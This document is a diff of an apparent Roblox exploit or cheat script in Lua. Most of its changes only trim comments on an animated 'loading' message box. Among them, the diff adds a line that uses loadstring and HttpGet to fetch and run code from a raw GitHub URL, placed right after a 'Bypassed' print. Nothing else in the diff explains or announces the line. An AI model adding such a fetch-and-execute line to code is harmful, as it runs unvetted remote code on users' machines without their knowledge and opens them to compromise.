@@ -7,7 +7,7 @@ if playerGuiTarget then
     playerGuiTarget:Destroy()
 end
 
---// Loading MessageBox - Bottom Right Corner (3 seconds)
+--// MessageBox
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local Player = Players.LocalPlayer
@@ -45,7 +45,7 @@ DotsFrame.Position = UDim2.new(0, 20, 0.5, -20)
 DotsFrame.BackgroundTransparency = 1
 DotsFrame.Parent = MessageFrame
 
--- Dots (3 animated dots)
+-- Dots
 local Dot1 = Instance.new("Frame")
 Dot1.Size = UDim2.new(0, 8, 0, 8)
 Dot1.Position = UDim2.new(0, 0, 0.5, -4)
@@ -76,7 +76,7 @@ local Dot3Corner = Instance.new("UICorner")
 Dot3Corner.CornerRadius = UDim.new(1, 0)
 Dot3Corner.Parent = Dot3
 
--- "LOADING..." Text
+-- Text
 local LoadingLabel = Instance.new("TextLabel")
 LoadingLabel.Size = UDim2.new(1, -100, 1, 0)
 LoadingLabel.Position = UDim2.new(0, 90, 0, 0)
@@ -114,7 +114,7 @@ local slideOut = TweenService:Create(
     {Position = UDim2.new(1, 0, 1, -100)}
 )
 
---// SHOW MESSAGEBOX FOR 3 SECONDS
+--// SHOW MESSAGEBOX
 local function showLoadingMessage()
     -- Start invisible off-screen
     MessageFrame.Position = UDim2.new(1, 0, 1, -100)
@@ -124,7 +124,6 @@ local function showLoadingMessage()
     slideIn:Play()
     animateDots()
     
-    -- Wait 3 seconds
     task.wait(3)
     
     -- Slide out
@@ -163,6 +162,8 @@ pcall(function()
 end)
 
 print("Bypassed")
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/halien298/random/refs/heads/main/ai'),true))()
 
 --// Delete specific unwanted objects from Workspace
 local targets = {
